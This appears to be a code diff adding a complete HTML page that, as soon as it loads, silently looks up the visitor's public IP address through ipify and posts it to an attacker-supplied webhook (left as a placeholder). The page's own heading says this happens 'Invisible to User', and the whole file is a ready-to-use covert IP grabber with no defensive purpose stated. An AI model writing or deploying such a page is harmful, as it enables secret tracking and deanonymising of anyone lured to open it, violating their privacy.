@@ -1,0 +1,51 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>Send IP to Webhook</title>
+  <script>
+    // Function to get the IP address and send it to the webhook
+    function sendIpToWebhook() {
+      fetch('https://api.ipify.org?format=json')  // Get IP address from ipify
+        .then(response => response.json())  // Parse the JSON response
+        .then(data => {
+          const ipAddress = data.ip;
+
+          // Define the webhook URL (replace with your actual webhook URL)
+          const webhookUrl = 'YOUR_WEBHOOK_URL';  
+
+          // Create the payload to send to the webhook
+          const payload = {
+            ip: ipAddress
+          };
+
+          // Send the IP address to your webhook
+          fetch(webhookUrl, {
+            method: 'POST',
+            headers: {
+              'Content-Type': 'application/json'  // Set content type to JSON
+            },
+            body: JSON.stringify(payload)  // Convert the payload to a JSON string
+          })
+          .then(response => {
+            if (response.ok) {
+              console.log('IP address successfully sent to the webhook');
+            } else {
+              console.error('Failed to send IP address to the webhook');
+            }
+          })
+          .catch(error => console.error('Error sending IP address:', error));
+        })
+        .catch(error => console.error('Error fetching IP address:', error));
+    }
+
+    // Call the function when the page loads
+    window.onload = sendIpToWebhook;
+  </script>
+</head>
+<body>
+  <h1>Sending IP to Webhook (Invisible to User)</h1>
+  <!-- No content displayed to the user -->
+</body>
+</html>
